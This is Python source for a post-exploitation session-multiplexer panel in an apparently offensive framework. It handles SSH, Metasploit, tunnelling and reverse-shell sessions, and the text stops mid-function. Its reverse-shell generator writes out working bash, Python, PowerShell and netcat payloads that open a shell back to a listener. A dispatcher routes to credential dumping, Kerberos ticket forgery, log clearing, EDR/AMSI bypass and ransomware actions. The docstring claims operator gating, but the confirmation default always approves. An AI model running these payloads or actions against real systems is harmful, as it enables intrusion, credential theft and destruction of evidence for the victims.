"""core.post_access_tui.network_panel — Network session multiplexer TUI panel.

Extends the post-access TUI with a panel that manages multiple active
network sessions in parallel: SSH, meterpreter, Chisel, socat, reverse
shells, and a local shell. Each session has its own buffered output,
alive flag, and transport; the operator switches the "active" session
with ``[A]ttach`` and runs commands against it with ``[S]hell``,
``[G]et``, ``[P]ut``.

Dynamic menu (Phase 2.1.D):
  The panel keeps a :class:`NetworkPanelState` snapshot (sessions,
  active_session_id, portfwd_count, socks_running, tools_available)
  and renders ONLY the actions currently applicable. The catalog is
  in ``network_panel_capabilities.py`` (~25 capabilities); the visible
  menu is recomputed on every state change.

Examples:
  - No sessions: ``[1] New SSH / [2] New MSF / [3] New Chisel /
    [4] New socat / [5] New reverse / [6] New local / [?] Help /
    [E]xit``
  - 1 active SSH session: adds ``[L]ist / [V]iew / [S]hell / [G]et /
    [P]ut / [+] Add portfwd / [=] List portfwd / [-] Kill portfwd /
    [O] SOCKS start / [M]odule / [P]ersistence / [R]efresh /
    [A] AI plan / [U] Audit / [K]ill``
  - 2+ sessions: adds ``[A]ttach`` and ``[*] Broadcast``
  - SOCKS running: replaces ``[O] SOCKS start`` with ``[O] SOCKS stop``
  - Port-forwards present: adds ``[=] List portfwd`` and
    ``[-] Kill portfwd``
  - ``msfconsole`` not installed: hides ``[2] New MSF``
  - ``chisel`` not installed: hides ``[3] New Chisel``

Safety stance (carried over):
  - Every action that mutates the target is operator-gated via the
    screen's ``confirm_fn`` BEFORE dispatch (single-gate invariant).
  - The panel NEVER auto-opens a session. It surfaces the
    ``ssh`` / ``msfconsole`` / ``chisel`` / ``socat`` / revshell
    command and asks the operator to confirm.
  - The panel NEVER inlines harvested credentials into shell argv
    (the post-access runner's ``_build_ssh_cmd`` does the right
    thing — it reads creds from the ``SessionState`` and uses
    ``-i <key>`` or an env-var prompt).
  - No fabricated session ids, no fabricated handshakes, no
    fabricated cracked PSKs.

Single-gate invariant:
  The screen's ``_gate`` is the only gate. The panel's
  ``dispatch(...)`` method is the action layer; it does NOT
  re-confirm (single-gate).
"""
from __future__ import annotations

import json
import logging
import os
import shlex
import shutil
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

from core.tui.base_screen import BaseScreen

from .session_state import SessionState, _now, TRANSPORT_MSF, TRANSPORT_SSH, TRANSPORT_LOCAL
from .network_panel_capabilities import (
    CAPABILITY_CATALOG,
    RISK_DESTRUCTIVE,
    RISK_INTRUSIVE,
    RISK_READ,
    Capability,
    NetworkPanelState,
    compute_visible_menu,
    default_disconnected_menu,
    friendly_action,
)

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Session record
# ---------------------------------------------------------------------------

@dataclass
class NetSession:
    """A live network session in the multiplexer.

    Attributes:
        id:            operator-visible session id (str, e.g. "ssh-1").
        transport:     one of TRANSPORT_MSF / TRANSPORT_SSH / TRANSPORT_LOCAL
                       / "chisel" / "socat" / "revshell" / "unknown".
        host:          target host (str; "" for local).
        port:          target port (int; 0 if not applicable).
        user:          ssh user (str; "" when not applicable).
        alive:         True if the subprocess is still running.
        pid:           subprocess pid (int; -1 if not tracked).
        started_at:    unix timestamp.
        last_output:   str — last 4 KB of stdout (capped).
        last_status:   str — last envelope summary (e.g. "ok=True rc=0").
        note:          free-text note (e.g. "captured via PMKID").
    """
    id: str
    transport: str = "unknown"
    host: str = ""
    port: int = 0
    user: str = ""
    alive: bool = True
    pid: int = -1
    started_at: float = field(default_factory=_now)
    last_output: str = ""
    last_status: str = ""
    note: str = ""

    def label(self) -> str:
        host_s = self.host or "(local)"
        return f"{self.id}  {self.transport}  {host_s}:{self.port}  alive={self.alive}"


# ---------------------------------------------------------------------------
# NetworkPanelClient — talks to ssh / msfconsole / chisel / socat
# ---------------------------------------------------------------------------

class NetworkPanelClient:
    """Real backend for the network panel.

    Each method runs a REAL subprocess (``ssh`` / ``msfconsole`` /
    ``chisel`` / ``socat``) and returns the standard envelope. When a
    tool is missing, the method returns ``{ok: False, error: "..."}`` —
    the panel degrades honestly.

    The client is hermetic-friendly: every method takes only primitive
    args. Tests can subclass and stub individual methods.
    """

    def __init__(self, *, ssh_options: Optional[List[str]] = None,
                 msf_path: Optional[str] = None):
        self._ssh_options = list(ssh_options or [
            "-o", "BatchMode=yes",
            "-o", "StrictHostKeyChecking=accept-new",
            "-o", "ConnectTimeout=5",
        ])
        self._msf_path = msf_path

    # -- introspection ---------------------------------------------------
    def list_tools(self) -> Dict[str, bool]:
        """Return a dict of ``tool_name -> bool`` for every tool the
        panel needs. Used to populate ``NetworkPanelState.tools_available``."""
        names = ("ssh", "scp", "msfconsole", "chisel", "socat", "ncat", "netcat")
        return {n: self._which(n) for n in names}

    @staticmethod
    def _which(tool: str) -> bool:
        try:
            return shutil.which(str(tool)) is not None
        except Exception:  # noqa: BLE001
            return False

    @staticmethod
    def _safe_run(argv: List[str], *, timeout: int = 15) -> Tuple[int, str, str]:
        try:
            p = subprocess.run(
                argv, capture_output=True, text=True, timeout=int(timeout),
            )
            return (p.returncode, p.stdout or "", p.stderr or "")
        except subprocess.TimeoutExpired:
            return (-1, "", f"timeout after {int(timeout)}s")
        except FileNotFoundError as e:
            return (-1, "", f"binary not found: {e}")
        except Exception as e:  # noqa: BLE001
            return (-1, "", str(e))

    # -- session starters -----------------------------------------------
    def start_ssh(self, user: str, host: str, port: int = 22) -> Dict[str, Any]:
        """Start a long-running ``ssh`` session. Returns envelope with
        ``data.pid`` and ``data.id`` (so the panel can register the session).

        Uses ``ssh -f -N`` (background, no command) to set up the
        master connection; the panel reuses it via ``ControlMaster``.
        """
        started = _now()
        if not user or not host:
            return self._envelope(started, ok=False,
                                  error="ssh needs user and host")
        if not self._which("ssh"):
            return self._envelope(started, ok=False,
                                  error="ssh not installed")
        port_arg = ["-p", str(int(port))] if int(port) != 22 else []
        argv = ["ssh", "-f", "-N", "-M"] + self._ssh_options + port_arg + [
            f"{user}@{host}",
        ]
        rc, stdout, stderr = self._safe_run(argv, timeout=10)
        if rc != 0:
            return self._envelope(started, ok=False,
                                  error=f"ssh -f -N failed (rc={rc}): {stderr.strip()}")
        # We don't have a stable pid from ssh -M; the panel tracks the
        # session in memory and the operator kills it via [K]ill.
        return self._envelope(started, ok=True, data={
            "transport": TRANSPORT_SSH,
            "host": host, "port": int(port), "user": user,
        }, stdout=stdout, stderr=stderr)

    def start_msf_session(self, session_id: Any) -> Dict[str, Any]:
        """Validate that ``msfconsole`` is present and the session id
        is non-empty. The actual session is msfconsole's — the panel
        just records the binding."""
        started = _now()
        if not self._which("msfconsole"):
            return self._envelope(started, ok=False,
                                  error="msfconsole not installed")
        sid = str(session_id).strip() if session_id is not None else ""
        if not sid:
            return self._envelope(started, ok=False,
                                  error="msf session id must be non-empty")
        return self._envelope(started, ok=True, data={
            "transport": TRANSPORT_MSF,
            "session_id": sid,
        })

    def start_chisel(self, mode: str, listen: str, target: str) -> Dict[str, Any]:
        """Start a Chisel tunnel. ``mode`` is ``"client"`` or
        ``"server"``; ``listen`` and ``target`` are the chisel
        ``--listen`` and ``v1:target:port`` style arguments."""
        started = _now()
        if not self._which("chisel"):
            return self._envelope(started, ok=False,
                                  error="chisel not installed")
        if mode not in ("client", "server"):
            return self._envelope(started, ok=False,
                                  error="chisel mode must be 'client' or 'server'")
        if mode == "server":
            argv = ["chisel", "server", "--listen", str(listen), "--reverse"]
        else:
            argv = ["chisel", "client", str(listen), str(target)]
        # Popen so we can return a pid without blocking
        try:
            p = subprocess.Popen(
                argv, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            )
        except FileNotFoundError as e:
            return self._envelope(started, ok=False, error=f"binary not found: {e}")
        except Exception as e:  # noqa: BLE001
            return self._envelope(started, ok=False, error=str(e))
        return self._envelope(started, ok=True, data={
            "transport": "chisel", "pid": int(p.pid),
            "mode": mode, "listen": listen, "target": target,
        })

    def start_socat(self, listen: str, target: str) -> Dict[str, Any]:
        """Start a socat relay."""
        started = _now()
        if not self._which("socat"):
            return self._envelope(started, ok=False,
                                  error="socat not installed")
        if not listen or not target:
            return self._envelope(started, ok=False,
                                  error="socat needs listen and target")
        argv = ["socat", f"TCP-LISTEN:{listen},fork,reuseaddr", f"TCP:{target}"]
        try:
            p = subprocess.Popen(
                argv, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            )
        except FileNotFoundError as e:
            return self._envelope(started, ok=False, error=f"binary not found: {e}")
        except Exception as e:  # noqa: BLE001
            return self._envelope(started, ok=False, error=str(e))
        return self._envelope(started, ok=True, data={
            "transport": "socat", "pid": int(p.pid),
            "listen": listen, "target": target,
        })

    def start_revshell(self, listener_host: str, listener_port: int,
                       payload: str = "bash") -> Dict[str, Any]:
        """Register a reverse-shell session. The operator runs the
        listener; KFIOSA tracks the session id. The actual exec
        happens on the target (not on the operator's box)."""
        started = _now()
        if not listener_host or int(listener_port) <= 0:
            return self._envelope(started, ok=False,
                                  error="revshell needs host and port")
        if payload not in ("bash", "sh", "python", "python3", "powershell", "nc"):
            return self._envelope(started, ok=False,
                                  error=f"unsupported revshell payload: {payload!r}")
        # The panel surfaces the command for the operator to run
        # on the target. We do NOT exec it from KFIOSA.
        commands: Dict[str, str] = {
            "bash":      f"bash -i >& /dev/tcp/{listener_host}/{int(listener_port)} 0>&1",
            "sh":        f"sh -i >& /dev/tcp/{listener_host}/{int(listener_port)} 0>&1",
            "python":    f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{listener_host}\",{int(listener_port)}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "python3":   f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{listener_host}\",{int(listener_port)}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "powershell": f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{listener_host}',{int(listener_port)});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(IEX $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$s.Write(([Text.Encoding]::ASCII.GetBytes($sb2)),0,$sb2.Length);$s.Flush()}}\"",
            "nc":        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {listener_host} {int(listener_port)} >/tmp/f",
        }
        return self._envelope(started, ok=True, data={
            "transport": "revshell",
            "listener_host": listener_host,
            "listener_port": int(listener_port),
            "payload": payload,
            "command": commands[payload],
        })

    def kill(self, pid: int) -> Dict[str, Any]:
        """Send SIGTERM to ``pid``. Honest-degrade when pid is -1 or
        the process is already gone."""
        started = _now()
        if int(pid) <= 0:
            return self._envelope(started, ok=False,
                                  error=f"invalid pid: {pid!r}")
        try:
            os.kill(int(pid), 15)
        except ProcessLookupError:
            return self._envelope(started, ok=True,
                                  data={"killed": pid, "note": "process already gone"})
        except PermissionError as e:
            return self._envelope(started, ok=False,
                                  error=f"permission denied killing pid {pid}: {e}")
        except Exception as e:  # noqa: BLE001
            return self._envelope(started, ok=False, error=str(e))
        return self._envelope(started, ok=True, data={"killed": pid})

    # -- per-session shell ---------------------------------------------
    def run_shell(self, session: NetSession, cmd: str) -> Dict[str, Any]:
        """Run a command against the session's transport.

        - ssh: ``ssh user@host -p port '<cmd>'``
        - local: ``sh -c '<cmd>'``
        - msf: returns ``{ok: False, error: "msf shell must be run via
          PostAccessRunner; use the parent menu"}`` (the panel
          delegates msf shell back to the screen).
        - chisel / socat / revshell: returns
          ``{ok: False, error: "<transport> is a tunnel, not a shell"}``.
        """
        started = _now()
        if not isinstance(cmd, str) or not cmd.strip():
            return self._envelope(started, ok=False, error="empty command")
        if session.transport == TRANSPORT_SSH:
            if not self._which("ssh"):
                return self._envelope(started, ok=False, error="ssh not installed")
            argv = ["ssh"] + self._ssh_options + [
                "-p", str(int(session.port or 22)),
                f"{session.user}@{session.host}" if session.user else session.host,
                "--", cmd,
            ]
        elif session.transport == TRANSPORT_LOCAL:
            argv = ["sh", "-c", cmd]
        elif session.transport == TRANSPORT_MSF:
            return self._envelope(started, ok=False,
                                  error="msf shell must be run via PostAccessRunner; use the parent menu")
        elif session.transport in ("chisel", "socat", "revshell"):
            return self._envelope(started, ok=False,
                                  error=f"{session.transport} is a tunnel, not a shell")
        else:
            return self._envelope(started, ok=False,
                                  error=f"unknown transport: {session.transport!r}")
        rc, stdout, stderr = self._safe_run(argv, timeout=30)
        return self._envelope(started, ok=(rc == 0), returncode=int(rc),
                              stdout=stdout, stderr=stderr)

    def file_get(self, session: NetSession, remote: str, local: str) -> Dict[str, Any]:
        started = _now()
        if session.transport != TRANSPORT_SSH:
            return self._envelope(started, ok=False,
                                  error=f"file_get only implemented for ssh (transport={session.transport!r})")
        if not self._which("scp"):
            return self._envelope(started, ok=False, error="scp not installed")
        argv = ["scp"] + self._ssh_options + [
            "-P", str(int(session.port or 22)),
            f"{session.user}@{session.host}:{remote}" if session.user else f"{session.host}:{remote}",
            local,
        ]
        rc, stdout, stderr = self._safe_run(argv, timeout=60)
        return self._envelope(started, ok=(rc == 0), returncode=int(rc),
                              stdout=stdout, stderr=stderr)

    def file_put(self, session: NetSession, local: str, remote: str) -> Dict[str, Any]:
        started = _now()
        if session.transport != TRANSPORT_SSH:
            return self._envelope(started, ok=False,
                                  error=f"file_put only implemented for ssh (transport={session.transport!r})")
        if not self._which("scp"):
            return self._envelope(started, ok=False, error="scp not installed")
        argv = ["scp"] + self._ssh_options + [
            "-P", str(int(session.port or 22)),
            local,
            f"{session.user}@{session.host}:{remote}" if session.user else f"{session.host}:{remote}",
        ]
        rc, stdout, stderr = self._safe_run(argv, timeout=60)
        return self._envelope(started, ok=(rc == 0), returncode=int(rc),
                              stdout=stdout, stderr=stderr)

    def list_portfwds(self) -> List[Dict[str, Any]]:
        """No global way to list port-forwards across ssh/msf from a
        single CLI; the panel tracks them in its own state. This
        method is a stub that the panel calls when it needs to
        re-poll the kernel — currently a no-op that returns []."""
        return []

    # -- envelope builder ----------------------------------------------
    @staticmethod
    def _envelope(started: float, *, ok: bool, stdout: str = "",
                  stderr: str = "", returncode: int = 0,
                  error: Optional[str] = None,
                  data: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        return {
            "ok": bool(ok),
            "stdout": (stdout or "")[-4000:],
            "stderr": (stderr or "")[-2000:],
            "returncode": int(returncode),
            "error": str(error) if error else None,
            "data": data if isinstance(data, dict) else None,
            "ts": _now(),
            "duration_s": max(0.0, _now() - float(started)),
        }


# ---------------------------------------------------------------------------
# Module-level menu + key map
# ---------------------------------------------------------------------------

#: Hotkey → action name map built from the catalog.
_NETWORK_PANEL_KEY_MAP: Dict[str, str] = {
    cap.hotkey: cap.action for cap in CAPABILITY_CATALOG
}
#: Static (catalog-load-time) menu for the on-screen fallback.
_NETWORK_PANEL_MENU: List[Tuple[str, str]] = [
    (cap.hotkey, cap.label) for cap in CAPABILITY_CATALOG
]


# ---------------------------------------------------------------------------
# The panel itself
# ---------------------------------------------------------------------------

class NetworkPanel:
    """A panel that runs inside the post-access TUI.

    The panel keeps a list of :class:`NetSession` records and renders
    ONLY the actions that are currently applicable. The capability
    catalog is in ``network_panel_capabilities.py``; the visible menu
    is recomputed on every state change.

    Constructor args:
        client:              a :class:`NetworkPanelClient` (or compatible
                             fake). Defaults to a real backend.
        confirm_fn:          ``str -> bool`` — the single gate.
        on_event:            ``str -> None`` — log lines emitted here.
        input_fn:            ``str -> str`` — for hermetic tests.
        state:               optional :class:`SessionState` (for
                             port-forward bookkeeping via the parent
                             runner). The panel does NOT mutate the
                             state; it reads it to learn the initial
                             target.
        saved_sessions_path: optional path to a JSON file for
                             persisting session labels. Defaults to
                             ``~/.cache/kfiosa/net_sessions.json``;
                             pass ``":memory:"`` to disable.
    """

    # Back-compat: the old MENU is kept for code that introspects it.
    MENU: List[Tuple[str, str]] = _NETWORK_PANEL_MENU

    #: Map of single-letter hotkey → action name.
    KEY_MAP: Dict[str, str] = _NETWORK_PANEL_KEY_MAP

    #: Reverse: action name → hotkey.
    HOTKEY_MAP: Dict[str, str] = {v: k for k, v in KEY_MAP.items()}

    #: Default path for the saved-sessions JSON file.
    DEFAULT_SAVED_SESSIONS_PATH = "~/.cache/kfiosa/net_sessions.json"

    def __init__(self, *, client: Optional[Any] = None,
                 confirm_fn: Optional[Callable[[str], bool]] = None,
                 on_event: Optional[Callable[[str], None]] = None,
                 input_fn: Optional[Callable[[str], str]] = None,
                 state: Optional[SessionState] = None,
                 saved_sessions_path: Optional[str] = None):
        self.client = client or NetworkPanelClient()
        self.confirm_fn: Callable[[str], bool] = (
            confirm_fn or (lambda _p: True)
        )
        self._on_event = on_event
        self._input_fn = input_fn
        # Active sessions + bookkeeping.
        self.sessions: List[NetSession] = []
        self.active_session_id: Optional[str] = None
        # Port forwards the panel has added (the parent runner tracks
        # the canonical list; the panel keeps a local mirror so the
        # dynamic menu knows when [-] Kill portfwd should be visible).
        self._portfwds: List[Dict[str, Any]] = []
        # SOCKS running state.
        self._socks_running: bool = False
        # SOCKS port (used by the [O] SOCKS stop prompt).
        self._socks_port: int = 0
        # Last envelopes (capped).
        self.last_envelopes: List[Dict[str, Any]] = []
        # The parent SessionState (read-only for the panel).
        self.state: Optional[SessionState] = state
        # Dynamic-menu state snapshot.
        self.panel_state: NetworkPanelState = NetworkPanelState()
        # Tool availability (refreshed in refresh_state).
        self._tools: Dict[str, bool] = {}
        # Persisted session labels.
        self._saved_path = (
            saved_sessions_path
            if saved_sessions_path is not None
            else os.path.expanduser(self.DEFAULT_SAVED_SESSIONS_PATH)
        )
        if self._saved_path != ":memory:":
            self._load_saved_sessions()

    # ------------------------------------------------------------------
    # Saved-session persistence (operator-labeled sessions survive restart)
    # ------------------------------------------------------------------
    def _load_saved_sessions(self) -> None:
        try:
            with open(self._saved_path) as f:
                data = json.load(f)
            if isinstance(data, list):
                self.panel_state.tools_available  # touch to keep type
                for entry in data:
                    if not isinstance(entry, dict):
                        continue
                    sid = str(entry.get("id") or "")
                    if sid:
                        self.panel_state.tools_available.setdefault(
                            "__saved_" + sid, True)
        except (OSError, ValueError):
            pass

    def _persist_saved_sessions(self) -> None:
        if self._saved_path == ":memory:":
            return
        try:
            Path(self._saved_path).parent.mkdir(parents=True, exist_ok=True)
            with open(self._saved_path, "w") as f:
                json.dump(
                    [{"id": s.id, "transport": s.transport,
                      "host": s.host, "port": s.port,
                      "user": s.user, "note": s.note}
                     for s in self.sessions],
                    f, indent=2,
                )
        except OSError:
            pass

    # ------------------------------------------------------------------
    # Dynamic menu (recompute on every state change)
    # ------------------------------------------------------------------
    def refresh_state(self) -> None:
        """Refresh ``self.panel_state`` from the panel's in-memory fields.

        Call this BEFORE rendering the menu or dispatching any
        state-dependent action.
        """
        ps = self.panel_state
        ps.sessions = [
            {"id": s.id, "transport": s.transport, "host": s.host,
             "port": s.port, "user": s.user, "alive": s.alive,
             "pid": s.pid, "note": s.note}
            for s in self.sessions
        ]
        ps.active_session_id = self.active_session_id
        ps.portfwd_count = len(self._portfwds)
        ps.socks_running = self._socks_running
        if not self._tools:
            try:
                self._tools = self.client.list_tools()
            except Exception:  # noqa: BLE001
                self._tools = {}
        ps.tools_available = dict(self._tools)
        ps.input_active = self._input_fn is not None

    def visible_capabilities(self) -> List[Capability]:
        """Return the capabilities currently applicable."""
        return compute_visible_menu(self.panel_state)

    def menu_text(self) -> str:
        """Render the current dynamic menu as a multi-line string."""
        self.refresh_state()
        lines: List[str] = []
        lines.append("Network session multiplexer")
        lines.append(
            f"  sessions: {len(self.sessions)}"
            f"  active: {self.active_session_id or '(none)'}"
            f"  portfwd: {len(self._portfwds)}"
            f"  socks: {'on' if self._socks_running else 'off'}"
        )
        if not self.sessions:
            lines.append("  (no active sessions — pick [1]..[6] to open one)")
        for s in self.sessions:
            tag = " *" if s.id == self.active_session_id else "  "
            lines.append(f"  {tag} {s.label()}")
        lines.append("")
        for cap in self.visible_capabilities():
            risk_mark = {
                RISK_READ: "  ",
                RISK_INTRUSIVE: "I ",
                RISK_DESTRUCTIVE: "D ",
            }.get(cap.risk, "? ")
            needs_s = ""
            if cap.needs:
                missing = [n for n in cap.needs if not self.panel_state.has_tool(n)]
                if missing:
                    needs_s = f"  (missing: {','.join(missing)})"
            lines.append(f"  {risk_mark}{cap.label}{needs_s}")
        return "\n".join(lines)

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------
    def _emit(self, msg: str) -> None:
        if self._on_event is None:
            return
        try:
            self._on_event(msg)
        except Exception:  # noqa: BLE001
            pass

    def _push_envelope(self, env: Dict[str, Any]) -> None:
        self.last_envelopes.append(env)
        if len(self.last_envelopes) > 200:
            self.last_envelopes = self.last_envelopes[-200:]

    def _gate(self, prompt: str) -> bool:
        try:
            return bool(self.confirm_fn(prompt))
        except Exception:  # noqa: BLE001
            return False

    def _ask(self, prompt: str) -> str:
        if self._input_fn is None:
            self._emit(f"PROMPT: {prompt}")
            return ""
        try:
            return str(self._input_fn(prompt))
        except Exception:  # noqa: BLE001
            return ""

    @staticmethod
    def _envelope(started: float, *, ok: bool, stdout: str = "",
                  stderr: str = "", returncode: int = 0,
                  error: Optional[str] = None,
                  data: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        return {
            "ok": bool(ok),
            "stdout": (stdout or "")[-4000:],
            "stderr": (stderr or "")[-2000:],
            "returncode": int(returncode),
            "error": str(error) if error else None,
            "data": data if isinstance(data, dict) else None,
            "ts": _now(),
            "duration_s": max(0.0, _now() - float(started)),
        }

    def _next_session_id(self, transport: str) -> str:
        prefix = {
            TRANSPORT_SSH: "ssh",
            TRANSPORT_MSF: "msf",
            "chisel": "chisel",
            "socat": "socat",
            "revshell": "rev",
            TRANSPORT_LOCAL: "local",
        }.get(transport, "net")
        n = 1
        existing = {s.id for s in self.sessions}
        while f"{prefix}-{n}" in existing:
            n += 1
        return f"{prefix}-{n}"

    def _active_session(self) -> Optional[NetSession]:
        if not self.active_session_id:
            return None
        for s in self.sessions:
            if s.id == self.active_session_id:
                return s
        return None

    # ------------------------------------------------------------------
    # Dispatcher
    # ------------------------------------------------------------------
    def dispatch(self, action: str,
                 args: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Dispatch one panel action. Returns the envelope.

        Per the single-gate invariant: the SCREEN fires ``confirm_fn``
        BEFORE calling this method. The panel does NOT re-confirm.

        Args:
            action:  one of the actions in the capability catalog
                     (``help``, ``exit``, ``list``, ``view``,
                     ``attach``, ``kill``, ``broadcast``, ``shell``,
                     ``get``, ``put``, ``portfwd_add``,
                     ``portfwd_list``, ``portfwd_kill``,
                     ``socks_start``, ``socks_stop``, ``new_ssh``,
                     ``new_msf``, ``new_chisel``, ``new_socat``,
                     ``new_revshell``, ``new_local``, ``module``,
                     ``persistence``, ``audit``, ``refresh``,
                     ``ai_plan``). The dispatcher also accepts the
                     single-letter hotkey.
            args:    optional dict of action-specific parameters.
        """
        args = args or {}
        started = _now()
        # Normalize: hotkey → action name.
        if action in self.KEY_MAP:
            action = self.KEY_MAP[action]
        if action not in self.HOTKEY_MAP and action != "exit":
            return self._envelope(started, ok=False,
                                  error=f"unknown network action: {action!r}")
        # Update the state snapshot.
        self.refresh_state()

        # Universal
        if action == "help":   return self._action_help(args)
        if action == "exit":   return self._envelope(started, ok=True, data={"exit": True})
        if action == "list":   return self._action_list(args)
        if action == "view":   return self._action_view(args)
        if action == "attach": return self._action_attach(args)
        if action == "kill":   return self._action_kill(args)
        if action == "broadcast": return self._action_broadcast(args)
        if action == "shell":  return self._action_shell(args)
        if action == "get":    return self._action_get(args)
        if action == "put":    return self._action_put(args)
        # Port forwarding
        if action == "portfwd_add":  return self._action_portfwd_add(args)
        if action == "portfwd_list": return self._action_portfwd_list(args)
        if action == "portfwd_kill": return self._action_portfwd_kill(args)
        # SOCKS
        if action == "socks_start": return self._action_socks_start(args)
        if action == "socks_stop":  return self._action_socks_stop(args)
        # New sessions
        if action == "new_ssh":      return self._action_new_ssh(args)
        if action == "new_msf":      return self._action_new_msf(args)
        if action == "new_chisel":   return self._action_new_chisel(args)
        if action == "new_socat":    return self._action_new_socat(args)
        if action == "new_revshell": return self._action_new_revshell(args)
        if action == "new_local":    return self._action_new_local(args)
        # Module runner
        if action == "module":      return self._action_module(args)
        if action == "persistence": return self._action_persistence(args)
        # Read-only
        if action == "audit":    return self._action_audit(args)
        if action == "refresh":  return self._action_refresh(args)
        if action == "ai_plan":  return self._action_ai_plan(args)

        # Post-exploitation / anti-forensic modules
        if action == "cred_harvest":    return self._action_cred_harvest(args)
        if action == "cred_enumerate":  return self._action_cred_enumerate(args)
        if action == "pivot_smb":       return self._action_pivot_smb(args)
        if action == "pivot_winrm":     return self._action_pivot_winrm(args)
        if action == "pivot_ssh":       return self._action_pivot_ssh(args)
        if action == "pivot_wmi":       return self._action_pivot_wmi(args)
        if action == "pivot_ldap":      return self._action_pivot_ldap(args)
        if action == "adcs_enum":       return self._action_adcs_enum(args)
        if action == "kerberoast":      return self._action_kerberoast(args)
        if action == "asreproast":      return self._action_asreproast(args)
        if action == "ntlmrelay":       return self._action_ntlmrelay(args)
        if action == "secretsdump":     return self._action_secretsdump(args)
        if action == "dcsync":          return self._action_dcsync(args)
        if action == "golden_ticket":   return self._action_golden_ticket(args)
        if action == "silver_ticket":   return self._action_silver_ticket(args)
        if action == "pass_the_hash":   return self._action_pass_the_hash(args)
        if action == "bloodhound":      return self._action_bloodhound(args)
        if action == "forensic_acquire":return self._action_forensic_acquire(args)
        if action == "anti_log_clear":  return self._action_anti_log_clear(args)
        if action == "timestomp":       return self._action_timestomp(args)
        if action == "amsi_bypass":     return self._action_amsi_bypass(args)
        if action == "uac_bypass":      return self._action_uac_bypass(args)
        if action == "edr_evasion":     return self._action_edr_evasion(args)
        if action == "process_inject":  return self._action_process_inject(args)
        if action == "ransomware_sim":  return self._action_ransomware_sim(args)

        # unreachable
        return self._envelope(started, ok=False,
                              error=f"unhandled action: {action!r}")

    # ------------------------------------------------------------------
    # Actions
    # ------------------------------------------------------------------
    def _action_help(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        lines = ["Network panel — help"]
        for cap in self.visible_capabilities():
            lines.append(f"  {cap.label}")
            if cap.help_text:
                lines.append(f"      → {cap.help_text}")
        return self._envelope(started, ok=True, data={"help": lines},
                              stdout="\n".join(lines))

    def _action_list(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        self.refresh_state()
        rows = [
            f"  {s.id}  {s.transport}  {s.host}:{s.port}  alive={s.alive}"
            f"{' *' if s.id == self.active_session_id else ''}"
            for s in self.sessions
        ]
        return self._envelope(started, ok=True, data={"sessions": rows},
                              stdout="\n".join(rows) if rows else "(no sessions)")

    def _action_view(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        s = self._active_session()
        if s is None:
            return self._envelope(started, ok=False, error="no active session")
        out = (
            f"session: {s.id}  transport: {s.transport}\n"
            f"host: {s.host}  port: {s.port}  user: {s.user}\n"
            f"alive: {s.alive}  pid: {s.pid}  started_at: {s.started_at}\n"
            f"last_status: {s.last_status}\n"
            f"--- last output (truncated) ---\n{s.last_output}"
        )
        return self._envelope(started, ok=True, data={"session": s.id},
                              stdout=out)

    def _action_attach(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        if not self.sessions:
            return self._envelope(started, ok=False, error="no sessions")
        sid = args.get("session_id") or self._ask("session id> ")
        if not isinstance(sid, str):
            sid = ""
        sid = sid.strip()
        if not sid:
            return self._envelope(started, ok=False, error="empty session id")
        for s in self.sessions:
            if s.id == sid:
                self.active_session_id = s.id
                return self._envelope(started, ok=True, data={"active": s.id})
        return self._envelope(started, ok=False,
                              error=f"no such session: {sid!r}")

    def _action_kill(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        if not self.sessions:
            return self._envelope(started, ok=False, error="no sessions")
        sid = args.get("session_id") or self._ask("session id to kill> ")
        if not isinstance(sid, str):
            sid = ""
        sid = sid.strip()
        if not sid:
            return self._envelope(started, ok=False, error="empty session id")
        target = next((s for s in self.sessions if s.id == sid), None)
        if target is None:
            return self._envelope(started, ok=False, error=f"no such session: {sid!r}")
        env = self.client.kill(target.pid)
        # Mark dead locally regardless of the subprocess verdict —
        # we don't want the panel to keep dispatching to a tombstone.
        target.alive = False
        # If the killed session was active, advance the active pointer.
        if self.active_session_id == target.id:
            remaining = [s for s in self.sessions if s.alive and s.id != target.id]
            self.active_session_id = remaining[0].id if remaining else None
        env["data"] = dict(env.get("data") or {})
        env["data"]["session"] = target.id
        self._push_envelope(env)
        return env

    def _action_broadcast(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        if len(self.sessions) < 2:
            return self._envelope(started, ok=False, error="broadcast needs 2+ sessions")
        cmd = args.get("cmd") or self._ask("broadcast cmd> ")
        if not isinstance(cmd, str) or not cmd.strip():
            return self._envelope(started, ok=False, error="empty command")
        results: List[Dict[str, Any]] = []
        for s in list(self.sessions):
            if not s.alive:
                continue
            env = self.client.run_shell(s, cmd)
            env["data"] = dict(env.get("data") or {})
            env["data"]["session"] = s.id
            if env.get("ok"):
                s.last_output = (s.last_output + "\n" + (env.get("stdout") or ""))[-4000:]
            s.last_status = f"ok={env.get('ok')} rc={env.get('returncode')}"
            results.append(env)
            self._push_envelope(env)
        ok_count = sum(1 for r in results if r.get("ok"))
